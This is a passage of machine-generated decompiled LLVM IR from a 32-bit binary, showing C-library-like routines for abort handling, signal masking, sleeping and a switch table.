  uselistorder label %dec_label_pc_8051a10, { 1, 0 }
}

define i32 @function_8051aff() local_unnamed_addr {
dec_label_pc_8051b1a.lr.ph:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8051b0b = call i32 @function_80520c7(i32 ptrtoint (i32* @global_var_80542f8.53 to i32))
  %v12_8051b15 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8051b1a48 = add i32 %v12_8051b15, 276
  %v5_8051b1a49 = inttoptr i32 %v4_8051b1a48 to i32*
  store i32 0, i32* %v5_8051b1a49, align 4
  %v0_8051b2550 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051b2551 = add i32 %v0_8051b2550, -1
  %v9_8051b2552 = icmp slt i32 %v1_8051b2551, 0
  store i32 %v1_8051b2551, i32* %eax.global-to-local, align 4
  %v1_8051b2653 = icmp eq i1 %v9_8051b2552, false
  br i1 %v1_8051b2653, label %dec_label_pc_8051b1a.dec_label_pc_8051b1a_crit_edge, label %dec_label_pc_8051b28

dec_label_pc_8051b1a.dec_label_pc_8051b1a_crit_edge: ; preds = %dec_label_pc_8051b1a.lr.ph, %dec_label_pc_8051b1a.dec_label_pc_8051b1a_crit_edge
  %v1_8051b2554 = phi i32 [ %v1_8051b25, %dec_label_pc_8051b1a.dec_label_pc_8051b1a_crit_edge ], [ %v1_8051b2551, %dec_label_pc_8051b1a.lr.ph ]
  %v0_8051b1a.pre = load i32, i32* @esp, align 4
  %v2_8051b1a = mul i32 %v1_8051b2554, 4
  %v3_8051b1a = add i32 %v0_8051b1a.pre, 152
  %v4_8051b1a = add i32 %v3_8051b1a, %v2_8051b1a
  %v5_8051b1a = inttoptr i32 %v4_8051b1a to i32*
  store i32 0, i32* %v5_8051b1a, align 4
  %v0_8051b25 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051b25 = add i32 %v0_8051b25, -1
  %v9_8051b25 = icmp slt i32 %v1_8051b25, 0
  store i32 %v1_8051b25, i32* %eax.global-to-local, align 4
  %v1_8051b26 = icmp eq i1 %v9_8051b25, false
  br i1 %v1_8051b26, label %dec_label_pc_8051b1a.dec_label_pc_8051b1a_crit_edge, label %dec_label_pc_8051b28

dec_label_pc_8051b28:                             ; preds = %dec_label_pc_8051b1a.dec_label_pc_8051b1a_crit_edge, %dec_label_pc_8051b1a.lr.ph
  %v0_8051b28 = load i32, i32* @ebx, align 4
  %v2_8051b2c = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8051b2c, i32* @ebx, align 4
  %v4_8051b34 = call i32 @function_8050b58(i32 %v2_8051b2c, i32 6, i32 %v0_8051b28, i32 %v0_8051b28)
  store i32 %v4_8051b34, i32* %eax.global-to-local, align 4
  %v1_8051b3c = icmp eq i32 %v4_8051b34, 0
  %v1_8051b3e = icmp eq i1 %v1_8051b3c, false
  br i1 %v1_8051b3e, label %dec_label_pc_8051b4e, label %dec_label_pc_8051b40

dec_label_pc_8051b40:                             ; preds = %dec_label_pc_8051b28
  %v3_8051b46 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8051b46 = call i32 @function_805049f(i32 1, %_TYPEDEF_sigset_t* %v3_8051b46, i32 0)
  store i32 %v4_8051b46, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051b4e

dec_label_pc_8051b4e:                             ; preds = %dec_label_pc_8051b28, %dec_label_pc_8051b40
  %v2_8051b8623 = phi i32 [ %v4_8051b34, %dec_label_pc_8051b28 ], [ %v4_8051b46, %dec_label_pc_8051b40 ]
  %v0_8051b4e = load i8, i8* @global_var_80543d4.54, align 4
  %v1_8051b4e = icmp eq i8 %v0_8051b4e, 0
  %v1_8051b55 = icmp eq i1 %v1_8051b4e, false
  br i1 %v1_8051b55, label %dec_label_pc_8051b86, label %dec_label_pc_8051b57

dec_label_pc_8051b57:                             ; preds = %dec_label_pc_8051b4e
  store i8 1, i8* @global_var_80543d4.54, align 4
  br label %dec_label_pc_8051b5e

dec_label_pc_8051b5e:                             ; preds = %dec_label_pc_8051bc5, %dec_label_pc_8051b57
  %v1_8051b66 = call i32 @function_80520c7(i32 ptrtoint (i32* @global_var_80542f8.53 to i32))
  store i32 %v1_8051b66, i32* %eax.global-to-local, align 4
  %v1_8051b72 = call i32 @function_8052a45(i32 6)
  store i32 %v1_8051b72, i32* %eax.global-to-local, align 4
  %v1_8051b7e = call i32 @function_80520c7(i32 ptrtoint (i32* @global_var_80542f8.53 to i32))
  store i32 %v1_8051b7e, i32* %eax.global-to-local, align 4
  %v0_8051b86.pre = load i8, i8* @global_var_80543d4.54, align 4
  br label %dec_label_pc_8051b86

dec_label_pc_8051b86:                             ; preds = %dec_label_pc_8051b4e, %dec_label_pc_8051b5e
  %v2_8051b86 = phi i32 [ %v2_8051b8623, %dec_label_pc_8051b4e ], [ %v1_8051b7e, %dec_label_pc_8051b5e ]
  %v0_8051b86 = phi i8 [ %v0_8051b4e, %dec_label_pc_8051b4e ], [ %v0_8051b86.pre, %dec_label_pc_8051b5e ]
  %v1_8051b86 = zext i8 %v0_8051b86 to i32
  %v3_8051b86 = and i32 %v2_8051b86, -256
  %v4_8051b86 = or i32 %v1_8051b86, %v3_8051b86
  store i32 %v4_8051b86, i32* %eax.global-to-local, align 4
  %v10_8051b8b = icmp eq i8 %v0_8051b86, 1
  %v1_8051b8d = icmp eq i1 %v10_8051b8b, false
  br i1 %v1_8051b8d, label %dec_label_pc_8051be7, label %dec_label_pc_8051bba.lr.ph

dec_label_pc_8051bba.lr.ph:                       ; preds = %dec_label_pc_8051b86
  store i8 2, i8* @global_var_80543d4.54, align 4
  %v2_8051b9e = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8051b9e, i32* %eax.global-to-local, align 4
  %v3_8051ba3 = bitcast i32* %stack_var_-272 to i8*
  %v4_8051ba3 = call i32 @function_80507bc(i8* %v3_8051ba3, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8051bba40 = add i32 %v12_8051b15, 140
  %v5_8051bba41 = inttoptr i32 %v4_8051bba40 to i32*
  store i32 -1, i32* %v5_8051bba41, align 4
  %v0_8051bc242 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051bc243 = add i32 %v0_8051bc242, -1
  %v9_8051bc244 = icmp slt i32 %v1_8051bc243, 0
  store i32 %v1_8051bc243, i32* %eax.global-to-local, align 4
  %v1_8051bc345 = icmp eq i1 %v9_8051bc244, false
  br i1 %v1_8051bc345, label %dec_label_pc_8051bba.dec_label_pc_8051bba_crit_edge, label %dec_label_pc_8051bc5

dec_label_pc_8051bba.dec_label_pc_8051bba_crit_edge: ; preds = %dec_label_pc_8051bba.lr.ph, %dec_label_pc_8051bba.dec_label_pc_8051bba_crit_edge
  %v1_8051bc246 = phi i32 [ %v1_8051bc2, %dec_label_pc_8051bba.dec_label_pc_8051bba_crit_edge ], [ %v1_8051bc243, %dec_label_pc_8051bba.lr.ph ]
  %v0_8051bba.pre = load i32, i32* @esp, align 4
  %v2_8051bba = mul i32 %v1_8051bc246, 4
  %v3_8051bba = add i32 %v0_8051bba.pre, 16
  %v4_8051bba = add i32 %v3_8051bba, %v2_8051bba
  %v5_8051bba = inttoptr i32 %v4_8051bba to i32*
  store i32 -1, i32* %v5_8051bba, align 4
  %v0_8051bc2 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051bc2 = add i32 %v0_8051bc2, -1
  %v9_8051bc2 = icmp slt i32 %v1_8051bc2, 0
  store i32 %v1_8051bc2, i32* %eax.global-to-local, align 4
  %v1_8051bc3 = icmp eq i1 %v9_8051bc2, false
  br i1 %v1_8051bc3, label %dec_label_pc_8051bba.dec_label_pc_8051bba_crit_edge, label %dec_label_pc_8051bc5

dec_label_pc_8051bc5:                             ; preds = %dec_label_pc_8051bba.dec_label_pc_8051bba_crit_edge, %dec_label_pc_8051bba.lr.ph
  store i32 %v2_8051b9e, i32* %eax.global-to-local, align 4
  %v4_8051bda = call i32 @function_8052307(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_8051bda, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051b5e

dec_label_pc_8051be7:                             ; preds = %dec_label_pc_8051b86
  %v10_8051be7 = icmp eq i8 %v0_8051b86, 2
  %v1_8051be9 = icmp eq i1 %v10_8051be7, false
  br i1 %v1_8051be9, label %dec_label_pc_8051bf3, label %dec_label_pc_8051bf3.thread

dec_label_pc_8051bf3.thread:                      ; preds = %dec_label_pc_8051be7
  store i8 3, i8* @global_var_80543d4.54, align 4
  br label %dec_label_pc_8051bfc

dec_label_pc_8051bf3:                             ; preds = %dec_label_pc_8051be7
  %v9_8051bf3 = icmp eq i8 %v0_8051b86, 3
  %v1_8051bfa = icmp eq i1 %v9_8051bf3, false
  br i1 %v1_8051bfa, label %dec_label_pc_8051c0d, label %dec_label_pc_8051bfc

dec_label_pc_8051bfc:                             ; preds = %dec_label_pc_8051bf3.thread, %dec_label_pc_8051bf3
  store i8 4, i8* @global_var_80543d4.54, align 4
  %v1_8051c08 = call i32 @function_8052468(i32 127)
  unreachable

dec_label_pc_8051c0d:                             ; preds = %dec_label_pc_8051bf3, %dec_label_pc_8051c0d
  br label %dec_label_pc_8051c0d

; uselistorder directives
  uselistorder i32 %v1_8051bc2, { 2, 1, 0 }
  uselistorder i32 %v1_8051b25, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 8, 7, 0, 1, 2, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 3, 4 }
  uselistorder i8 3, { 4, 5, 0, 1, 2, 3 }
  uselistorder i8 2, { 8, 14, 9, 1, 10, 2, 3, 4, 5, 6, 11, 12, 7, 0, 13 }
  uselistorder i8* @global_var_80543d4.54, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8051c0d, { 1, 0 }
  uselistorder label %dec_label_pc_8051bfc, { 1, 0 }
  uselistorder label %dec_label_pc_8051bba.dec_label_pc_8051bba_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8051b86, { 1, 0 }
  uselistorder label %dec_label_pc_8051b4e, { 1, 0 }
  uselistorder label %dec_label_pc_8051b1a.dec_label_pc_8051b1a_crit_edge, { 1, 0 }
}

define i32 @function_8051d53(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051d53:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8051d66 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8051d66, i32* @ebx, align 4
  %v2_8051d6b = call i32 @function_80520ca(i32 %v2_8051d66, i32 134553799)
  %v1_8051d77 = call i32 @function_80520c7(i32 ptrtoint (i32* @global_var_8054310.55 to i32))
  %v0_8051d7c = load i32, i32* @global_var_80543d8.56, align 8
  store i32 %v0_8051d7c, i32* @eax, align 4
  %v1_8051d84 = icmp eq i32 %v0_8051d7c, 0
  br i1 %v1_8051d84, label %dec_label_pc_8051d91, label %dec_label_pc_8051d88

dec_label_pc_8051d88:                             ; preds = %dec_label_pc_8051d53
  %v0_8051d8b = load i32, i32* @esi, align 4
  %v1_8051d8c = call i32 @unknown_0(i32 %v0_8051d8b)
  store i32 %v1_8051d8c, i32* @eax, align 4
  br label %dec_label_pc_8051d91

dec_label_pc_8051d91:                             ; preds = %dec_label_pc_8051d53, %dec_label_pc_8051d88
  %v2_8051d96 = call i32 @function_80520ca(i32 %v2_8051d66, i32 1)
  %v0_8051d9b = call i32 @function_8052088()
  %v0_8051db4 = load i32, i32* @esi, align 4
  %v1_8051db5 = call i32 @function_8052468(i32 %v0_8051db4)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_8052468, { 1, 0 }
  uselistorder i32 (i32)* @function_80520c7, { 3, 2, 1, 0, 7, 6, 4, 5, 10, 9, 8 }
  uselistorder i32 (i32, i32)* @function_80520ca, { 1, 0, 9, 8, 7, 6, 5, 2, 4, 3, 13, 12, 11, 10 }
  uselistorder label %dec_label_pc_8051d91, { 1, 0 }
}

define i32 @function_8051dba() local_unnamed_addr {
dec_label_pc_8051dba:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_8051dba = load i32, i32* @ebp, align 4
  %v0_8051dbb = load i32, i32* @edi, align 4
  %v0_8051dbc = load i32, i32* @esi, align 4
  %v0_8051dbd = load i32, i32* @ebx, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %tmp32, i32* %edx.global-to-local, align 4
  %v1_8051dd0 = icmp eq i32 %tmp32, 0
  %v1_8051dd2 = icmp eq i1 %v1_8051dd0, false
  br i1 %v1_8051dd2, label %dec_label_pc_8051dd9.lr.ph, label %dec_label_pc_8051f31

dec_label_pc_8051dd9.lr.ph:                       ; preds = %dec_label_pc_8051dba
  %v15_8051dbe = ptrtoint i32* %stack_var_-444 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8051dd956 = add i32 %v15_8051dbe, 416
  %v5_8051dd957 = inttoptr i32 %v4_8051dd956 to i32*
  store i32 0, i32* %v5_8051dd957, align 4
  %v0_8051de458 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051de459 = add i32 %v0_8051de458, -1
  %v9_8051de460 = icmp slt i32 %v1_8051de459, 0
  store i32 %v1_8051de459, i32* %eax.global-to-local, align 4
  %v1_8051de561 = icmp eq i1 %v9_8051de460, false
  br i1 %v1_8051de561, label %dec_label_pc_8051dd9.dec_label_pc_8051dd9_crit_edge, label %dec_label_pc_8051de7

dec_label_pc_8051dd9.dec_label_pc_8051dd9_crit_edge: ; preds = %dec_label_pc_8051dd9.lr.ph, %dec_label_pc_8051dd9.dec_label_pc_8051dd9_crit_edge
  %v1_8051de462 = phi i32 [ %v1_8051de4, %dec_label_pc_8051dd9.dec_label_pc_8051dd9_crit_edge ], [ %v1_8051de459, %dec_label_pc_8051dd9.lr.ph ]
  %v0_8051dd9.pre = load i32, i32* @esp, align 4
  %v2_8051dd9 = mul i32 %v1_8051de462, 4
  %v3_8051dd9 = add i32 %v0_8051dd9.pre, 292
  %v4_8051dd9 = add i32 %v3_8051dd9, %v2_8051dd9
  %v5_8051dd9 = inttoptr i32 %v4_8051dd9 to i32*
  store i32 0, i32* %v5_8051dd9, align 4
  %v0_8051de4 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051de4 = add i32 %v0_8051de4, -1
  %v9_8051de4 = icmp slt i32 %v1_8051de4, 0
  store i32 %v1_8051de4, i32* %eax.global-to-local, align 4
  %v1_8051de5 = icmp eq i1 %v9_8051de4, false
  br i1 %v1_8051de5, label %dec_label_pc_8051dd9.dec_label_pc_8051dd9_crit_edge, label %dec_label_pc_8051de7

dec_label_pc_8051de7:                             ; preds = %dec_label_pc_8051dd9.dec_label_pc_8051dd9_crit_edge, %dec_label_pc_8051dd9.lr.ph
  %v1_8051de4.lcssa = phi i32 [ %v1_8051de459, %dec_label_pc_8051dd9.lr.ph ], [ %v1_8051de4, %dec_label_pc_8051dd9.dec_label_pc_8051dd9_crit_edge ]
  store i32 %tmp32, i32* %stack_var_-24, align 4
  %v2_8051dfd = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8051dfd, i32* @ebx, align 4
  store i32 %v2_8051dfd, i32* %stack_var_-460, align 4
  %v4_8051e05 = call i32 @function_8050b58(i32 %v2_8051dfd, i32 17, i32 %v1_8051de4.lcssa, i32 %v1_8051de4.lcssa)
  store i32 %v4_8051e05, i32* %eax.global-to-local, align 4
  %v2_8051e0d = icmp slt i32 %v4_8051e05, 0
  br i1 %v2_8051e0d, label %dec_label_pc_8051f35, label %dec_label_pc_8051e15

dec_label_pc_8051e15:                             ; preds = %dec_label_pc_8051de7
  %v2_8051e16 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_8051e16, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_8051e21 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_8051e21 = call i32 @function_805049f(i32 0, %_TYPEDEF_sigset_t* %v3_8051e21, i32 %v2_8051e16)
  store i32 %v4_8051e21, i32* %eax.global-to-local, align 4
  %v1_8051e29 = icmp eq i32 %v4_8051e21, 0
  %v1_8051e2b = icmp eq i1 %v1_8051e29, false
  br i1 %v1_8051e2b, label %dec_label_pc_8051f35, label %dec_label_pc_8051e31

dec_label_pc_8051e31:                             ; preds = %dec_label_pc_8051e15
  store i32 %v2_8051e16, i32* %stack_var_-460, align 4
  %v4_8051e36 = call i32 @function_8050b34(i32 %v2_8051e16, i32 17, i32 %v4_8051e21, i32 %v4_8051e21)
  store i32 %v4_8051e36, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_8051e43 = icmp eq i32 %v4_8051e36, 0
  br i1 %v1_8051e43, label %dec_label_pc_8051e4c.lr.ph, label %dec_label_pc_8051eff

dec_label_pc_8051e4c.lr.ph:                       ; preds = %dec_label_pc_8051e31
  store i32 31, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v5_8051dd957, align 4
  %v0_8051e5750 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051e5751 = add i32 %v0_8051e5750, -1
  %v9_8051e5752 = icmp slt i32 %v1_8051e5751, 0
  store i32 %v1_8051e5751, i32* %edx.global-to-local, align 4
  %v1_8051e5853 = icmp eq i1 %v9_8051e5752, false
  br i1 %v1_8051e5853, label %dec_label_pc_8051e4c.dec_label_pc_8051e4c_crit_edge, label %dec_label_pc_8051e5a

dec_label_pc_8051e4c.dec_label_pc_8051e4c_crit_edge: ; preds = %dec_label_pc_8051e4c.lr.ph, %dec_label_pc_8051e4c.dec_label_pc_8051e4c_crit_edge
  %v1_8051e5754 = phi i32 [ %v1_8051e57, %dec_label_pc_8051e4c.dec_label_pc_8051e4c_crit_edge ], [ %v1_8051e5751, %dec_label_pc_8051e4c.lr.ph ]
  %v0_8051e4c.pre = load i32, i32* @esp, align 4
  %v2_8051e4c = mul i32 %v1_8051e5754, 4
  %v3_8051e4c = add i32 %v0_8051e4c.pre, 292
  %v4_8051e4c = add i32 %v3_8051e4c, %v2_8051e4c
  %v5_8051e4c = inttoptr i32 %v4_8051e4c to i32*
  store i32 0, i32* %v5_8051e4c, align 4
  %v0_8051e57 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051e57 = add i32 %v0_8051e57, -1
  %v9_8051e57 = icmp slt i32 %v1_8051e57, 0
  store i32 %v1_8051e57, i32* %edx.global-to-local, align 4
  %v1_8051e58 = icmp eq i1 %v9_8051e57, false
  br i1 %v1_8051e58, label %dec_label_pc_8051e4c.dec_label_pc_8051e4c_crit_edge, label %dec_label_pc_8051e5a

dec_label_pc_8051e5a:                             ; preds = %dec_label_pc_8051e4c.dec_label_pc_8051e4c_crit_edge, %dec_label_pc_8051e4c.lr.ph
  store i32 %v2_8051dfd, i32* %eax.global-to-local, align 4
  store i32 %v2_8051dfd, i32* %stack_var_-460, align 4
  %v4_8051e66 = call i32 @function_8050b58(i32 %v2_8051dfd, i32 17, i32 0, i32 0)
  store i32 %v4_8051e66, i32* %eax.global-to-local, align 4
  %v2_8051e6e = icmp slt i32 %v4_8051e66, 0
  br i1 %v2_8051e6e, label %dec_label_pc_8051f35, label %dec_label_pc_8051e76

dec_label_pc_8051e76:                             ; preds = %dec_label_pc_8051e5a
  %v2_8051e77 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_8051e77, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_8051e80 = call i32 @function_8052307(i32 17, i32* null, i32 %v2_8051e77)
  store i32 %v4_8051e80, i32* %eax.global-to-local, align 4
  %v2_8051e88 = icmp slt i32 %v4_8051e80, 0
  %v1_8051e8a = icmp eq i1 %v2_8051e88, false
  br i1 %v1_8051e8a, label %dec_label_pc_8051eb4, label %dec_label_pc_8051e8c

dec_label_pc_8051e8c:                             ; preds = %dec_label_pc_8051e76
  %v0_8051e8c = load i32, i32* %stack_var_-460, align 4
  %v1_8051e8c = call i32 @function_805076b(i32 %v0_8051e8c)
  store i32 %v1_8051e8c, i32* %eax.global-to-local, align 4
  store i32 %v1_8051e8c, i32* @ebx, align 4
  %v1_8051e93 = inttoptr i32 %v1_8051e8c to i32*
  %v2_8051e93 = load i32, i32* %v1_8051e93, align 4
  store i32 %v2_8051e93, i32* @esi, align 4
  store i32 %v2_8051e16, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8051ea2 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8051ea2 = call i32 @function_805049f(i32 2, %_TYPEDEF_sigset_t* %v3_8051ea2, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8051ead = load i32, i32* @esi, align 4
  %v1_8051ead = load i32, i32* @ebx, align 4
  %v2_8051ead = inttoptr i32 %v1_8051ead to i32*
  store i32 %v0_8051ead, i32* %v2_8051ead, align 4
  %v0_8051f42.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051f38

dec_label_pc_8051eb4:                             ; preds = %dec_label_pc_8051e76
  %v3_8051eb4 = load i32, i32* %stack_var_-420, align 4
  %v12_8051eb4 = icmp eq i32 %v3_8051eb4, 1
  %v2_8051ec0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8051ec0, i32* @ebx, align 4
  %v1_8051ec7 = icmp eq i1 %v12_8051eb4, false
  br i1 %v1_8051ec7, label %dec_label_pc_8051eee, label %dec_label_pc_8051ec9

dec_label_pc_8051ec9:                             ; preds = %dec_label_pc_8051eb4
  %v0_8051ec9 = load i32, i32* @edi, align 4
  store i32 %v2_8051ec0, i32* %stack_var_-460, align 4
  %v4_8051ecd = bitcast i32* %stack_var_-24 to %timespec*
  %v5_8051ecd = call i32 @function_805285f(%timespec* %v4_8051ecd, i32 %v2_8051ec0, i32 %v0_8051ec9, i32 %v0_8051ec9)
  store i32 %v5_8051ecd, i32* %eax.global-to-local, align 4
  store i32 %v5_8051ecd, i32* @edi, align 4
  %v1_8051ed4 = call i32 @function_805076b(i32 %v2_8051ec0)
  store i32 %v1_8051ed4, i32* %eax.global-to-local, align 4
  store i32 %v1_8051ed4, i32* @ebx, align 4
  %v1_8051ede = inttoptr i32 %v1_8051ed4 to i32*
  %v2_8051ede = load i32, i32* %v1_8051ede, align 4
  store i32 %v2_8051ede, i32* @esi, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8051ee5 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8051ee5 = call i32 @function_805049f(i32 2, %_TYPEDEF_sigset_t* %v3_8051ee5, i32 0)
  store i32 %v4_8051ee5, i32* %eax.global-to-local, align 4
  %v0_8051eea = load i32, i32* @esi, align 4
  %v1_8051eea = load i32, i32* @ebx, align 4
  %v2_8051eea = inttoptr i32 %v1_8051eea to i32*
  store i32 %v0_8051eea, i32* %v2_8051eea, align 4
  %v0_8051f14.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051f11

dec_label_pc_8051eee:                             ; preds = %dec_label_pc_8051eb4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8051ef4 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8051ef4 = call i32 @function_805049f(i32 2, %_TYPEDEF_sigset_t* %v3_8051ef4, i32 0)
  store i32 %v4_8051ef4, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051f0a

dec_label_pc_8051eff:                             ; preds = %dec_label_pc_8051e31
  %v2_8051f01 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8051f01, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051f0a

dec_label_pc_8051f0a:                             ; preds = %dec_label_pc_8051eee, %dec_label_pc_8051eff
  %storemerge3.pre-phi = phi i32 [ %v2_8051ec0, %dec_label_pc_8051eee ], [ %v2_8051f01, %dec_label_pc_8051eff ]
  %v3_8051f0a = phi i32 [ %v2_8051e16, %dec_label_pc_8051eee ], [ %v4_8051e36, %dec_label_pc_8051eff ]
  %v2_8051f0a = phi i32 [ 0, %dec_label_pc_8051eee ], [ %v4_8051e36, %dec_label_pc_8051eff ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_8051f0a = bitcast i32* %stack_var_-24 to %timespec*
  %v5_8051f0a = call i32 @function_805285f(%timespec* %v4_8051f0a, i32 %storemerge3.pre-phi, i32 %v2_8051f0a, i32 %v3_8051f0a)
  store i32 %v5_8051f0a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051f11

dec_label_pc_8051f11:                             ; preds = %dec_label_pc_8051ec9, %dec_label_pc_8051f0a
  %v0_8051f14 = phi i32 [ %v0_8051f14.pre, %dec_label_pc_8051ec9 ], [ %v5_8051f0a, %dec_label_pc_8051f0a ]
  %v1_8051f14 = icmp eq i32 %v0_8051f14, 0
  br i1 %v1_8051f14, label %dec_label_pc_8051f31, label %dec_label_pc_8051f18

dec_label_pc_8051f18:                             ; preds = %dec_label_pc_8051f11
  %v4_8051f28 = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_8051f28, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051f38

dec_label_pc_8051f31:                             ; preds = %dec_label_pc_8051dba, %dec_label_pc_8051f11
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051f38

dec_label_pc_8051f35:                             ; preds = %dec_label_pc_8051e5a, %dec_label_pc_8051e15, %dec_label_pc_8051de7
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051f38

dec_label_pc_8051f38:                             ; preds = %dec_label_pc_8051f31, %dec_label_pc_8051f18, %dec_label_pc_8051e8c, %dec_label_pc_8051f35
  %v0_8051f42 = phi i32 [ 0, %dec_label_pc_8051f31 ], [ %v4_8051f28, %dec_label_pc_8051f18 ], [ %v0_8051f42.pre, %dec_label_pc_8051e8c ], [ -1, %dec_label_pc_8051f35 ]
  store i32 %v0_8051dbd, i32* @ebx, align 4
  store i32 %v0_8051dbc, i32* @esi, align 4
  store i32 %v0_8051dbb, i32* @edi, align 4
  store i32 %v0_8051dba, i32* @ebp, align 4
  ret i32 %v0_8051f42

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_8051ed4, { 1, 0, 2 }
  uselistorder i32 %v2_8051ec0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8051e57, { 2, 1, 0 }
  uselistorder i32 %v4_8051e36, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8051e16, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v2_8051dfd, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_8051de4, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32 %tmp32, { 0, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 2, 3, 6, 7, 0, 1, 4, 5 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 0, 1, 23 }
  uselistorder i32 (i32, i32*, i32)* @function_8052307, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_8050b58, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_8051f38, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051f31, { 1, 0 }
  uselistorder label %dec_label_pc_8051f11, { 1, 0 }
  uselistorder label %dec_label_pc_8051f0a, { 1, 0 }
  uselistorder label %dec_label_pc_8051e4c.dec_label_pc_8051e4c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8051dd9.dec_label_pc_8051dd9_crit_edge, { 1, 0 }
}

define i32 @function_8051f43(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051f43:
  switch i32 %arg1, label %dec_label_pc_8051f62 [
    i32 0, label %dec_label_pc_8051f72
    i32 1, label %dec_label_pc_8052057
    i32 2, label %dec_label_pc_8051f7c
    i32 3, label %dec_label_pc_8051f86
    i32 4, label %dec_label_pc_8051f90
    i32 5, label %dec_label_pc_8052026
    i32 6, label %dec_label_pc_8051f98
    i32 7, label %dec_label_pc_8051f58
    i32 8, label %dec_label_pc_8051f58
    i32 9, label %dec_label_pc_8051f58
    i32 10, label %dec_label_pc_8051f58
    i32 11, label %dec_label_pc_8051f58
    i32 12, label %dec_label_pc_8051f58
    i32 13, label %dec_label_pc_8051f58
    i32 14, label %dec_label_pc_8051f58
    i32 15, label %dec_label_pc_8051f58
    i32 16, label %dec_label_pc_8051f58
    i32 17, label %dec_label_pc_8051f58
    i32 18, label %dec_label_pc_8051f58
    i32 19, label %dec_label_pc_8051f58
    i32 20, label %dec_label_pc_8051f58
    i32 21, label %dec_label_pc_8051f58
    i32 22, label %dec_label_pc_8051f58
    i32 23, label %dec_label_pc_8052057
    i32 24, label %dec_label_pc_8052057
